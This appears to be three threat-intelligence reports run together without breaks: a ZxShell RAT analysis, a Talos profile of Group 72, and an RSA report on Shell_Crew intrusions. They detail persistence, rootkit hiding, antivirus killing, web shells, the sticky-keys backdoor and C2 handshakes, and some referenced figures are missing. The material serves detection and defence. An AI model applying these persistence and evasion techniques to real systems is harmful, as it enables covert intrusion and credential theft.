We have analyzed the most common version of ZxShell , version 3.10 .
There are newer versions , up to version 3.39 as of October 2014 .
An individual who goes by the name LZX in some online forums is believed to be the original author of ZxShell .
Since ZxShell has been around since at least 2004 , numerous people have purchased or obtained the tools necessary to set up ZxShell command and control servers ( C & C ) and generate the malware that is placed on the victim 's network .
To illustrate the functionality of main ZxShell module , Let 's take a look at the following sample : MD5 : e3878d541d17b156b7ca447eeb49d96a SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c It exports the following functions , which are examined in greater detail below : DllMain Install UnInstall ServiceMain ShellMain ShellMainThread zxFunction001 zxFunction002 DllMain performs the initialization of ZxShell .
It allocates a buffer of 0x2800 bytes and copies the code for the ZxGetLibAndProcAddr function .
To copy memory , the memcpy function is invoked .
It is not directly used from msvcrt.dll but is instead copied to another memory chunk before being called .
Finally , the trojan Import Address Table ( IAT ) is resolved and the file path of the process that hosts the dll is resolved and saved in a global variable .
The Svchost group registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost is opened and the netsvc group value data is queried to generate a name for the service .
Before the malware can be installed a unique name must to be generated for the service .
The malware accomplishes this through querying the netsvc group value data located in the svchost group registry key which is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost .
At startup , Svchost.exe checks the services part of the registry and constructs a list of services to load .
Each Svchost session can contain multiple shared services that are organized in groups .
Therefore , separate services can run , depending on how and where Svchost.exe is started .
Each value under this key represents a separate Svchost group and appears as a separate instance when you are viewing active processes .
Each value is a REG_MULTI_SZ value and contains the services that run under that Svchost group .
Each Svchost group can contain one or more service names that are extracted from the following registry key , whose Parameters key contains a ServiceDLL value : HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service On a Windows machine , the netsvc group contains names of both existing and non - existing services .
The service 's existence is verified with the ServiceExists function , which attempts to open the relative registry sub - key in HKLM\SYSTEM\CurrentControlSet\Services .
The first service name that is not installed on the system becomes the ZxShell service name .
A new service is then created using the service parser function ProcessScCommand .
There are minor differences between the ZxShell implementation of this command and the original Windows one , but they are irrelevant for the purpose of the analysis The command used to install the service is : sc create < service name > < service name > `` % SystemRoot % \System32\svchost.exe -k netsvcs '' where < service name > is the chosen infected service name .
The installed service registry key is opened and the 2 values under its Parameter subkey are created .
These 2 values , ServiceDll and ServiceDllUnloadOnStop are needed for services that run in a shared process .
Before the service is started ChangeServiceConfig is called to modify the service type to shared and interactive .
If the service fails to start then a random service name formatted as netsvc_xxxxxxxx , where xxxxxxxx represent an 8-digit random hex value , is added to the netsvc group and the entire function is repeated .
This function is the entry point of the service .
It registers the service using the RegisterServiceCtrlHandler Windows API function .
The ZxShell service handler routine is only a stub : it responds to each service request code , doing nothing , and finally exits .
It sets the service status to RUNNING and finally calls the ShellMain function of ZxShell .
The ShellMain function is a stub that relocates the DLL to another buffer and spawns a thread that starts from ShellMainThreadInt at offset + 0xC0CD .
The ShellMainThreadInt function gets the HeapDestroy Windows API address and replaces the first 3 bytes with the RET 4 opcode .
Subsequently , it calls the FreeLibrary function to free its own DLL buffer located at its original address .
Because of this , the allocated heaps will not be freed .
It re - copies the DLL from the new buffer to the original one using the memcpy function .
Finally , it spawns the main thread that starts at the original location of ShellMainThread procedure , and terminates .
At this point , the ZxShell library is no longer linked in the module list of the host process .
This is important because if any system tool tries to open the host process it will never display the ZxShell DLL .
This thread implements the main code , responsible for the entire botnet DLL .
First , it checks if the DLL is executed as a service .
If so , it spawns the service watchdog thread .
The watchdog thread checks the registry path of the ZxShell service every 2 seconds , to verify that it has n't been modified .
If a user or an application modifies the ZxShell service registry key , the code restores the original infected service key and values .
The buffer containing the ZxShell Dll in the new location is freed using the VirtualFree API function .
A handle to the DLL file is taken in order to make its deletion more difficult .
The ZxShell mutex is created named @ _ ZXSHELL _ @ .
The plugin registry key HKLM\SYSTEM\CurrentControlSet\Control\zxplug is opened and each value is queried .
The registry value contains the plugin file name .
The target file is loaded using the LoadLibrary API function , and the address of the exported function zxMain is obtained with GetProcAddress .
If the target filename is incorrect or invalid the plugin file is deleted and the registry value is erased .
That is performed by the function DeleteAndLogPlugin .
Otherwise , the plugin is added to an internal list .
Here is the data structure used to keep track of the plugins : The thread KeyloggerThread is spawned and is responsible for doing keylogging on the target workstation .
We will take a look at the keylogger later on .
Finally the main network communication function GetIpListAndConnect is called .
This function is at the core of the RAT 's network communication .
It starts by initializing a random number generator and reading 100 bytes inside the ZxShell Dll at a hardcoded location .
These bytes are XOR encrypted with the byte - key 0x85 and contains a list of remote hosts where to connect .
The data is decrypted , the remote host list is parsed and verified using the BuildTargetIpListStruct function .
There are 3 types of lists recognized by ZxShell : plain ip addresses , HTTP and FTP addresses .
If the list does not contain any item , or if the verification has failed , the ZxShell sample tries to connect to a hardcoded host with the goal of retrieving a new updated list .
Otherwise , ZxShell tries to connect to the first item of the list .
If ZxShell successfully connects to the remote host , the function DoHandshake is called .
This function implements the initial handshake which consists of exchanging 16 bytes , 0x00001985 and 0x00000425 , with the server .
The function GetLocalPcDescrStr is used to compose a large string that contains system information of the target workstation .
That information is the following : local hostname organization owner operating system details CPU speed total physical memory The string is sent to the remote host and the response is checked to see if the first byte of the response is 0xF4 , an arbitrary byte .
If it is , the botnet connection I / O procedure is called through the MainConnectionIo function .
Image 4 .
The GetLocalPcDescrStr and DoHandshake functions called beforestarting the command processing Otherwise , the ZxShell code closes the socket used and sleeps for 30 seconds .
It will then retry the connection with the next remote host , if there is one .
It is noteworthy that this function includes the code to set the ZxShell node as a server : if one of the hardcoded boolean value is set to 1 , a listening socket is created .
The code waits for an incoming connection .
When the connection is established a new thread is spawned that starts with the MainConnectionIo function .
The MainConnectionIo function checks if the Windows Firewall is enabled , sets the Tcp Keep Alive value and Non - blocking mode connection options and receives data from the remote host through the ReceiveCommandData function .
If the communication fails , ZxShell disables the firewall by modifying the registry key : HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile Then the connection is retried .
The received command is then processed by the ZxShell function with the ProcessCommand function .
The command processing function starts by substituting the main module name and path in the hosting process PEB , with the one of the default internet browser .
The path of the main browser of the workstation is obtained by reading the registry value : HKLM\SOFTWARE\Classes\HTTP\shell\open\command Image 5 .
Our test workstation use Windows Internet Explorer as default browser This trick renders identification by firewall more cumbersome .
A host firewall will recognize the outgoing connection as originated by the browser instead of the ZxShell service host process .
The browser process always performs outgoing connections and the firewall should n't block them .
The command processing is straightforward .
Here is the list of common commands : This set of functionality allows the operator complete control of a system .
Being able to transfer and execute files on the infected system means the attacker can run any code they please .
Further , the keylogging and remote desktop functionality allows the operator to spy on the infected machine , observing all keystrokes and viewing all user actions .
Unloads ZxShell and deletes all of the active components .
This simply deletes the ZxShell service key from the Windows registry ( using SHDeleteKey Api ) and all of the subkeys .
Finally , it marks ZxShell main Dll for deletion with the MoveFileEx Windows API .
This function is the supporting functionality for WinVNC .
To allow the VNC session to connect , the current network socket WSAProtcol_Info structure is written to a named pipe prior to calling zxFunction001 .
Once the named pipe has been created , CreateProcessAsUserA is called with the following as the CommandLine parameter : zxFunction001 modifies the current process memory , uses data contained in the named pipe to create a socket , and then executes the code that sends the remote desktop session to the server controller .
This function will either bind the calling process to a port or has the calling process connect to a remote host .
The function is called in the following manner : The functionality ( connect or bind ) depends on the data contained within the named pipe .
Unlike zxFunction001 , this is not used by any of the RAT commands in the zxshell.dll .
Apart from user - mode ZxShell droppers mentioned earlier , there is a file ( SHA256 : 1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335 ) that installs a kernel device driver called loveusd.sys .
The architecture of this dropper is different from the others : it starts extracting the main driver from itself .
It adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver .
In our analysed sample the `` Loveusd.sys '' driver is installed with the name `` USBHPMS '' .
Finally the driver is started using the ZwLoadDriver native API .
The ZxShell driver starts by acquiring some kernel information and then hooking `` ObReferenceObjectByHandle '' API .
Finally it spawns 2 system threads .
The first thread is the `` communication '' thread .
Its principal duties are to create the ZxShell main DLL in '' c : \Windows\System32\commhlp32.dll '' and to install the Kernel `` Load Image Notify routine '' .
The code then tries to kill each process and service that belongs to the following list of AV products : Symantec Firewall Norton ESET McAfee Avast Avira Sophos Malwarebytes Next , the ZxShell Load - Image Notify function prevents the AV processes from restarting .
The installation procedure continues in the user - mode dropper .
The ZxShell service is installed as usual , and the in - execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call .
This handle value is invalid : all the windows kernel handle values are by design a multiple of 4 .
The ZxShell hook code knows that and intercept it .
The hook installed by ZxShell implements one of its filtering routine .
It filters each attempt to open the ZxShell protected driver or the main DLL , returning a reference to the `` netstat.exe '' file .
The protection is enabled to all processes except for ones in the following list : Svchost.exe , Lsass.exe , Winlogon.exe , Services.exe , Csrss.exe , ctfmon.exe , Rundll32.exe , mpnotify.exe , update.exe .
If the type of the object that the system is trying to validate is a process , the hook code rewrites again the configuration data of the ZxShell service in the windows registry .
The last type of Kernel modification that ZxShell rootkit performs is the system call dispatcher ( KiFastCallEntry ) hook .
In this manner , ZxShell is able to completely hide itself , intercepting the following Kernel API calls : ZwAllocateVirtualMemory , ZwOpenEvent , ZwQueryDirectoryFile , ZwWriteFile , ZwEnumerateKey , and ZwDeviceIoControlFile .
Sample ( SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c ) is configured to act as a server .
The symbol `` g_bCreateListenSck '' is set to 1 .
This means that , as seen above , the ZxShell Dll is started in listening mode .
It connects to the first remote C & C that tries to contact it and succeeds in the handshake .
The encrypted IP address is '' 127.0.0.2 '' ( used as loopback ) and no connection is made on that IP address ( due to the listening variable set to 1 ) .
We used the ZxShell package for version 3.10 ( SHA256 : 1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4 ) .The
The buttons are all in Chinese , with the help of Google Translate and keen detective skills ( read : button clicking ) , we ' ve deciphered the functionality .
When you start the controller , you need to set the port you want to listen on and if you ' ve set a password , add it here .
Once an infected machine connects , you see its information displayed in a selection box at the top .
There are some built in functions on the side for the more common features .
These include remote desktop , webcam spying , remote shell , and file management .
You can also select a host and type help for a full list of commands .
I have the same machine infected with two different version of ZxShell .
Sending the help command for each , you can see the extra features added between version 3.1 and 3.2 .
Keylogging , ZXARPS ( IP and URL spoofing ) , and SYNFlood are some of the interesting features added to version 3.2 .
We wrote a script to extract version info from the binaries we have .
This configuration info can be changed with a tool included in the ZxShell package .
In versions 3.22 and 3.39 the routine changes .
The new xor encoding byte is 0x5B .
The data is stored in the last 0x100 bytes of the file .
The first 8 bytes of data are static .
Then there is the dll install name , the domain , and the port .
Knowing the obfuscation routines for this data we wrote a script to extract the URLs / IPs and ports stored .
The most common ports used are , 80 , 1985 , 1986 , and 443 .
Port 80 and 443 are the default ports for HTTP and HTTPS traffic .
The next most common is port 53 .
This is used in some of the newer 3.22 and 3.39 samples .
After that , the count for each port starts declining sharply .
The choices are interesting though , many correspond to what looks like the birth year of the controller ( ie .
Since this malware dates back to around 2004 , there are many samples containing CNC URLs from the 3322.org page .
This page used to offer no - ip type hosting and was widely used by malware authors .
So much so that Microsoft did a takedown in 2012 .
A similar service , vicp.net , is also seen in many of the domains .
In the malware , if a domain is configured , it will retrieve domain.tld/myip.txt .
This file contains a list of IP addresses for the infected machine to connect back to .
Otherwise , if an IP address is configured , it will connect directly to that IP address .
We have written a simple C++ ZxShell Server that implements the communication and the handshake for the version 3.10 and 3.20 of the ZxShell DLL .
The implementation is quite simple : After the handshake , 2 threads that deal with data transfer are spawned .
Here we have some screenshots that show the Server and the ZxShell Keylogger in action : Our server has accepted a connection from a remote host The ZxShell keylogger has captured 2 user passwords ( gmail.com and amazon.com ) The last image shows a very interesting feature of the ZxShell keylogger : once installed and activated , the keylogger is able to catch each password that the user inserts in the login box of each website ( like Google , Amazon and so on … ) .
This makes the keylogger a perfect weapons for the attackers .
They will be able to steal and resell in the underground market the sensitive data of each victim .
Advanced persistent threats will remain a problem for companies and organizations of all sizes , especially those with high financial or intellectual property value .
Group 72 's involvement in Operation SMN is another example of what sort of damage that can be done if organizations are not diligent in their efforts to secure their networks .
Its detection and removal can be difficult due to the various techniques used to conceal its presence , such as disabling the host anti - virus , masking its installation on a system with a valid service name , and by masking outbound traffic as originating from a web browser .
While other techniques are also utilized to conceal and inhibit its removal , ZxShell 's primary functionality is to act as a Remote Administration Tool ( RAT ) , allowing the threat actor to have continuous backdoor access on to the compromised machine .
As our analysis demonstrates , ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly valuable information .
The threat posed by ZxShell to organizations is one that can not be ignored .
Organizations with high financial or intellectual property value should take the time to ensure their security requirements are met and that employee 's are educated about the security threats their organizations face .
For additional information , please see our blog post .
Protecting Users from These Threats Advanced Malware Protection ( AMP ) is ideally suited to detect the sophisticated malware used by this threat actor .
The Network Security protection of IPS and NGFW have up - to - date signatures to detect malicious network activity by threat actors .
Initial connection from the infected computer 's perspective -- after it connects to the controller - The rules are on the first 8 bytes of the first two packets .
They are hard coded in the binaries .
The rest of the bytes are variable ( for example , 66664640 is a floating point version number of ZxShell ) .
Snort rules : These rules have been released in our community ruleset and can be downloaded and used directly , or via pulledpork from Snort.org These signatures are available within the ClamAV database .
Please run freshclam to ensure you stay updated with the latest coverage .
Here 's a list for some ZxShell functions for sample SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c : Here is a non - exhaustive list of ZxShell samples that were analyzed for this report .
Here is a list of Domains organized by port .
This post is co - authored by Joel Esler , Martin Lee and Craig Williams Everyone has certain characteristics that can be recognised .
This may be a way of walking , an accent , a turn of phrase or a style of dressing .
If you know what to look for you can easily spot a friend or acquaintance in a crowd by knowing what characteristics to look for .
Exactly the same is true for threat actors .
Each threat actor group may have certain characteristics that they display during their attack campaigns .
These may be the types of malware that they use , a pattern in the naming conventions of their command and control servers , their choice of victims etc .
Collecting attack data allows an observer to spot the characteristics that define each group and identify specific threat actors from the crowd of malicious activity on the internet .
Talos security and intelligence research group collects attack data from our various telemetry systems to analyse , identify and monitor threat actors through their different tactics , techniques , and procedures .
Rather than give names to the different identified groups , we assign numbers to the threat actors .
We frequently blog about significant attack campaigns that we discover , behind the scenes we integrate our intelligence data directly into our products .
As part of our research we keep track of certain threat actor groups and their activities .
In conjunction with a number of other security companies , we are taking action to highlight and disrupt the activities of the threat actors identified by us as Group 72 .
Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta .
The group is sophisticated , well funded , and possesses an established , defined software development methodology .
The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors .
Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea .
The preferred tactics of the group include watering - hole attacks , spear - phishing , and other web - based tactics .
The tools and infrastructure used by the attackers are common to a number of other threat actor groups which may indicate some degree of overlap .
We have seen similar patterns used in domain registration for malicious domains , and the same tactics used in other threat actor groups leading us to believe that this group may be part of a larger organization that comprises many separate teams , or that different groups share tactics , code and personnel from time to time .
It is possible that Group 72 has a vulnerability research team searching for 0-day vulnerabilities in Windows .
The group is associated with the initial attack campaigns utilising exploits for the following vulnerabilities CVE-2014 - 0322 and CVE-2012 - 4792 .
We have also observed them using SQL injection as part of their attacks , and exploits based on CVE-2012 - 1889 and CVE-2013 - 3893 .
Frequently the group deploys a remote access trojan ( RAT ) on compromised machines .
These are used both to steal data and credentials from compromised machines , and to use the machine as a staging post to conduct attacks against further systems on the network , allowing the attackers to spread their compromise within the organization .
Unlike some threat actors , Group 72 does not prefer to use a single RAT as part of their attacks .
We have observed the group to use the following RAT malware : Gh0st RAT ( aka Moudoor ) Poison Ivy ( aka Darkmoon ) HydraQ ( aka 9002 RAT aka McRAT aka Naid ) Hikit ( aka Matrix RAT aka Gaolmay ) Zxshell ( aka Sensode ) DeputyDog ( aka Fexel ) - Using the kumanichi and moon campaign codes Derusbi PlugX ( aka Destroy RAT aka Thoper aka Sogu ) HydraQ and Hikit , according to our data are unique to Group 72 and to two other threat actor groups .
While their operational security is very good , patterns in their domains can be identified such as seemingly naming domains after their intended victim .
We have observed domains such as companyname.attackerdomain.com and companyacronym.attackerdomain.com .
We have also observed similar patterns in the disposable email addresses used to register their domains .
These slips , among others , allow us to follow their activities .
Intriguingly we have observed the same email address being used in the activities of this and two other threat actor groups .
This may suggest that these three groups are indeed one unit , or possibly hint at shared staff or ancillary facilities .
We will post a follow up with more technical detail in the coming days .
The Network Security protection of IPS and NGFW have up - to- date signatures to detect malicious network activity by threat actors .
The purpose of this report is to share actionable threat intelligence associated with an advanced adversary the RSA IR Team is tracking .
Threat intelligence related to advanced adversaries enables security practitioners to mitigate threat impact before the adversary becomes entrenched in an organization 's infrastructure .
If a breach has already occurred , threat intelligence bolsters incident investigation activities and expedites remediation ; ultimately reducing exposure times and minimizing potential data loss .
During recent engagements , the RSA IR Team has responded to multiple incidents involving a common adversary targeting each client 's infrastructure and assets .
The RSA IR Team is referring to this threat group internally as `` Shell_Crew '' ; however , they are also referred to as Deep Panda , WebMasters , KungFu Kittens , SportsFans , and PinkPanther amongst the security community .
Shell_Crew is generally known to utilize the following tactics , techniques , and procedures ( TTPs ) ;  Prevalent use of Web shells to maintain low level persistence in spite of determined remediation efforts ;  Occasional use of Web application framework exploits to achieve initial entry as opposed to traditional spearfishing attempts ;  Lateral movement using compromised credentials with RDP , psexec , or network connections in conjunction with scheduling jobs with the `` at '' command .
This emerging threat profile covers a sampling of observed indicators that have been derived by analyzing a variety of tools and malicious code collected during recent engagements involving Shell_Crew .
Included are details about an observed intrusion vector , entrenchment techniques , unique malicious files , and tools that are used by this adversary .
Additionally , the RSA IR Team has provided content in the form of a digital appendix that can be integrated into Security Analytics , the Enterprise Compromise Assessment Tool ( ECAT ) , or other security tools for rapid detection and visibility of indicators associated with Shell_Crew .
Shell_Crew has an affinity for exploiting web application vulnerabilities to gain access to the victim 's network and information systems .
In this section , we ' ve provided details pertaining to an instance where Shell_Crew breached a victim network through the exploitation of an Adobe ColdFusion directory traversal vulnerability ( CVE-2010 - 2861 ) .
This exploit allowed Shell_Crew to read the ' password.properties ' file containing the password hash of the ColdFusion ' administrator ' account .
After obtaining this password hash , Shell_Crew was able to recover the password associated with the administrative account , likely by using pre - computed rainbow tables .
Using the acquired administrator account credentials , Shell_Crew created a ColdFusion scheduled task to download a malicious Web shell to the ColdFusion server .
They then utilized this Web shell to upload additional Web shells , hash dumping tools , and other Trojans onto the system , as well as created a backdoor into the system for reentry .
Using the tools uploaded to the server , Shell_Crew dumped password hashes from the compromised system , performed network reconnaissance , and moved laterally to systems in the internal network using the compromised credentials with the pass - the - hash technique .
Figure 1 below illustrates the high level anatomy of this particular Shell_Crew attack .
Figure 2 below depicts a log entry from the Web server that illustrates the initial point of exploitation .
The data highlighted in blue shows the directory traversal used to access the password.properties file .
In addition , the data highlighted with red ( zh - cn ) in the User - Agent indicates the language tag on the attacker 's system .
The password.properties file contained the hash value of the ColdFusion administrator account , which can be seen in Figure 3 below : Through review of log files found on the Web server , the RSA IR team identified that within 10 minutes of retrieving the password.properties file , Shell_Crew logged in to the ColdFusion management page using the recovered administrator account credentials .
This indicates that Shell_Crew quickly enumerated the password from the hash value found in the password.properties file .
Once logged in with the administrator account , Shell_Crew scheduled a job called `` test '' to download a file containing a ColdFusion Web shell from `` http : //mpe.ie/1234.zip '' and save it to the Web server 's local 1 directory D : \mywebsite\x.cfm .
The log entry from the Web server that shows scheduling of this job is visible in Figure 4 .
The file downloaded from the remote system to the ColdFusion server , 1234.zip , is a ColdFusion Web shell called `` cfm backdoor by ufo '' .
Once the Web shell was downloaded to the Web server by the ColdFusion job , the adversary was able to utilize the functionality of the Web shell to execute commands on the local system , illustrated in Figure 5 and Figure 6 .
Once Shell_Crew has a foothold into the victim 's network , they move to other systems within the environment to ensure multiple points for re - entry .
Some of the techniques used by Shell_Crew to further insert themselves into a victim 's environment are outlined in the next section of this report ; Entrenchment Techniques Shell_Crew uses a variety of techniques to entrench themselves in a victim 's network .
For purposes of this report , the term entrenchment is used to describe a technique used by the adversary that allows them to maintain unauthorized access into an enterprise despite attempted remediation efforts by the victim .
In addition to traditional Trojans that beacon out to a destination IP address , this adversary has also been observed utilizing the following entrenchment techniques ;  Installation of Web shells ;  Registering DLLs with Internet Information Services ( IIS ) ;  Modifying the ' System . Web.dll ' file ;  Trojan . Derusbi ; and  Utilizing the RDP backdoor ' sethc.exe ' .
This section of the report discusses each of these entrenchment techniques in further detail .
Web shells are files containing malicious code written in various Web scripting languages , such as JSP , CFM , ASP , ASPX , or PHP , that when hosted on a publicly accessible Web site allow an adversary such as Shell_Crew to gain remote access and perform various unauthorized activities on a compromised system and network .
A Web shell can be a stand - alone file that only contains Web shell code , or can be an insertion of malicious code directly into an existing legitimate Web site page , thus allowing the adversary to blend with normal traffic and files on the Web server .
Using Web shells has several advantages over traditional Trojans including :  Low detection rates from Anti - Virus programs due to the variety and customization of code ;  The inability to block or monitor an IP since connectivity can be initiated from any source address ; and  There is no beaconing activity from a Web shell .
The complexity of the Web shells used by Shell_Crew varies dramatically .
Figure 7 shows the contents of a simple Web shell identified during a recent engagement where Shell_Crew had uploaded the Web shell as a standalone file .
This one line of code allowed Shell_Crew to execute shell commands remotely on the Web server .
The red text depicted within the example has been changed as the password value used by Shell_Crew made reference to the name of the victim company .
Shell_Crew also uses more complex Web shells that contain hundreds of lines of code and offer advanced functionality equal to many capable Trojans .
This functionality can include capabilities such as :  File system traversal ;  File / folder upload , download , and modify ;  Command execution ;  Time stomp files / folder ;  Database connectivity ; and  Communication obfuscation ( typically Base64 or ASCII hex encoding ) .
Figure 8 below is a screenshot of the ColdFusion Web shell used by Shell_Crew as referenced in the Intrusion Vector section of this report .
This Web shell contains robust capabilities such as command execution , directory traversal , file uploads , and the ability to gather basic system information .
Figure 9 below is an example where a malicious DLL was registered with the IIS Web server using the command line .
The ScriptMaps.vbs 2 file is a built in function of IIS for running VBScripts , and is fully documented in MSDN .
This command line modification will ensure that any incoming request ( whether it is a GET , POST , HEAD , or TRACE ) with a .jna
This allows Shell_Crew to make different requests ; both in the request type , such as GET or POST , and the file being requested , making detection more difficult .
This method of using various request parameters can be coupled with erratic IP Addresses further decreasing the likelihood that the activity will be detected by conventional means .
Figure 10 depicts a sample request to a compromised Web server .
This entrenchment technique was discovered after Shell_Crew made POST requests to nonexistent Web pages on a Web server running IIS .
The POST requests always started with a marker string that looked like a hash value .
Requests to the same non - existent Web page without the marker would result in a code 404 , i.e .
Figure 11 shows an example of a POST request sent by Shell_Crew to a non - existent webpage .
The typically benign .NET
Microsoft file ' System . Web.dll ' is an assembly that contains several namespaces .
When decompiled with a .NET
Decompiler ( such as .NET
Reflector ) the result will be hundreds of C # scripts .
Shell_Crew replaced the existing System . Web.dll with a version which contained changes to two C # scripts :  Disassembler\System . Web\System\Web\UI\PageHandlerFactory.cs  Disassembler\System . Web\System\Web\Util\default_aspx.cs The first script file PagehandlerFactory.cs contains adversary added code that looks for this marker in the content of the request : 4B39DD871AD56E6BFEC750C33138B985 .
When the marker is present , it lets default_aspx.cs handle the request that follows the marker .
Figure 12 highlights the modifications made to the PagehandlerFactory.cs file .
When called by the script PagehandlerFactory.cs , the file default_aspx.cs , which also contains code added by the adversary , performs the eval function on the request sent in the original POST request to the non - existent Web page .
In this instance , the POST request contained data that was Base64 encoded to obfuscate the malicious nature of the request , as shown in Figure 14 .
Below in Figure 15 is the decoded blue text from the POST request in Figure 14 .
Additionally , the actual command within the above POST request is also Base64 encoded .
Below in Figure 16 , the encoded text from the above POST request decoded .
The reply from the server to these POST requests is not obfuscated and could be found in Web server log files as shown in Figure 17 .
In addition to deploying traditional versions of what Symantec calls Trojan . Derusbi ( i.e .
Trojan . Derusbi typically consists of a DLL and driver file .
The driver of the customized Trojan . Derusbi variant in this example monitors all TCP ports that are utilized by various Windows services .
When a connection is established on any TCP port , the driver checks to see if it received a handshake packet .
The handshake packet contains a simple structure , which allows the Trojan to function even on busy Web servers .
When a handshake packet is received , the DLL also replies back with a handshake packet .
In addition to the handshake , this variant of Trojan . Derusbi also has an authentication step where the client must send the right password to the Trojan .
The communication protocol consist of a 24 byte header , and the data is compressed and obfuscated with 4-byte XOR key , which is dynamically generated for each transmission , and which is included in the 24-byte header .
This Trojan offers both typical and advanced Trojan functionalities , such as : file traversal , process start / terminate , upload / download , time stomping , and self - updating .
Analysis of customized Trojan . Derusbi variants utilized by Shell_Crew can be found in the below Malicious Files and Secondary Tools section .
This well - known technique that is commonly referred to as the sticky - keys backdoor is used when systems on the targeted organization have Microsoft Remote Desktop Protocol ( RDP ) enabled .
While this technique is not exclusive to Shell_Crew , the RSA IR Team has observed this group utilize the technique in several different environments .
There are two common ways that a system can be exploited using this technique .
File sethc.exe is replaced with another file ( typically cmd.exe or explorer.exe ) in one or both of these two locations : C : \Windows\system32\sethc.exe C : \Windows\system32\dllcache\sethc.exe The result of making this change on a system which has RDP enabled , is that once presented with the RDP Windows logon screen , simply pressing the SHIFT key 5 times will launch either a command shell ( cmd.exe ) , a windows explorer window ( explorer.exe ) , or whatever program was copied to replace the sethc.exe application executable .
The second technique makes a registry modification to launch a debugger anytime sethc.exe is executed and registers cmd.exe ( or any other file ) as the debugger .
So , anytime sethc.exe is invoked ( explained in the next paragraph ) , Windows automatically executes its `` debugger '' , i.e.cmd.exe .
The registry modification is shown in Figure 18 .
The result of making this change on a system which has RDP enabled , is that once presented with the RDP Windows logon screen , simply pressing the SHIFT key 5 times will launch either a command shell , cmd.exe as shown in Figure 18 , or whichever program has been set as the debug program in the registry .
The process runs under the context of the SYSTEM account .
Since this technique does not involve any malicious files , there is limited capability for AV vendors to detect this backdoor .
Figure 19 shows an example of a system that has the Stick Key set to present a command shell when invoked .
Shell_Crew uses a variety of malicious Trojans and tools to entrench themselves , move laterally , and persist within a targeted environment .
This portion of the report will detail the malicious files and secondary tools identified during recent engagements involving Shell_Crew .
The sections are broken up as follows :  Malicious Files and Secondary Tools Hash List ;  Malicious Files – Technical Analysis ; and  Secondary Tools – Technical Analysis The following list of Trojans and tools have been used by Shell_Crew during various investigations conducted by the RSA IR team .
The Web shells that are often used by Shell_Crew can be easily modified for specific missions or victims , and subsequently , hash values are not listed for those files .
Additionally , many Web shell samples identified reference specific victim names , which once redacted , would change the hash value of the file .
Shell_Crew uses a variety of malicious Trojans and tools to entrench themselves in a customer environment , however they consistently employ Trojans such as Trojan . Derusbi and variations of this Trojan family .
This portion of the report will detail the technical analysis of two of the custom variations of Trojan . Derusbi used by Shell_Crew .
The RSA IR Team has observed Shell_Crew deploy different variants of the Trojan . Derusbi family .
This Trojan family provides attackers a backdoor into the enterprise , as well as functionality to locate and decrypt passwords stored on the system by web browsers like Firefox and Internet Explorer , gather system and network information , and upload or download files .
Details of a sample found during a recent engagement involving Shell_Crew have been provided in Figure 20 .
It should be noted that the original sample contained a hard coded URL that made reference to a company name ; because of this , the hard coded IP Address was replaced and the MD5 and SHA1 hash values provided above are for the sanitized file .
This Trojan has an embedded and encoded driver file that is written to the infected system and then launched .
This driver will hook the IP , TCP , UDP , and RawIP driver files that normally run on a system .
When this particular Trojan . Derusbi variant is initially executed it checks to see if the registry key '' HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security '' is present in the registry .
This registry key location is where the Trojan will store its encoded configuration data .
If the key is not present on the system , the sample will first decode the configuration data that is embedded in the Trojan found at position 0x1EC88 .
Figure 21 below shows the function responsible for decoding this embedded data with the XOR key ' 0x 76 2D F2 41 ' .
Once the configuration data has been initially decoded , it will be placed into memory and the Trojan will resolve the current machine name and append 4 characters of pseudorandom data separated by a dash `` - '' .
This null terminated string will then overwrite the first portion of data in the decoded configuration file .
The data below in Figure 22 illustrates the decoded configuration data .
The machine name string and the hard coded C2 for this sample are highlighted in yellow ( and have been changed to protect the victim ) .
This machine specific configuration data will then be encoded , using a different method , where each byte is XORed with 0x5F and then each bit of that product byte is subsequently inverted .
This encoded data will then be written to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security registry key .
Figure 23 below shows the function within the Trojan responsible for encoding this data and then writing it to the registry .
If the sample is restarted it will again check for the registry value containing the configuration data .
If this value is located , the sample will read the configuration data and then decode it using a function similar to the function that is depicted below .
Upon initial execution , the Trojan will decode , write , and launch a driver file that is embedded in the file at offset 0x19A40 .
The data shown below in Figure 24 is how the data resides in the file .
As shown in Figure 24 , the first DWORD that is highlighted in yellow is the 4 byte XOR key that is used to decode the driver file .
It should be noted that this XOR key is the same in several variants that were compiled over a year time frame .
The second DWORD highlighted in blue is the length of data to be decoded ( the size of the driver file ) 0x52 18 or 21,016 bytes decimal .
The function below in Figure 25 is responsible for decoding the driver file .
This function will call an additional function that is responsible for writing the decoded data to disk as ' C : \Windows\System32\Drivers\ { 6AB5E732-DFA9 - 4618-AF1C- F0D9DEF0E222 } .sys
The Trojan will then use the API call ZwLoadDriver to start the newly created file .
The driver will hook other networking drivers and will determine if incoming traffic contains certain patterns of traffic , which when specific conditions are met will pipe that traffic to Trojan . Derusbi .
Once the Trojan begins to communicate with the hard coded C2 , it will initially transmit the following POST request shown in Figure 26 .
If no response is received it will transmit the following binary data shown in Figure 27 , which is part of a proprietary handshake that is discussed more in the Trojan . Derusbi – Server Variant section .
The Binary data contains a set of three DWORDs that the C2 will validate to as part of the initial portion of the handshake .
The first DWORD is created just prior to the beaconing activity .
The following two DWORDs are mathematical modifications of the first DWORD .
As illustrated below in Figure 28 , the second DWORD is the product of XORing the first DWORD with 0xFF .
The third DWORD is the product of rotating the first DWORD value right by 7 .
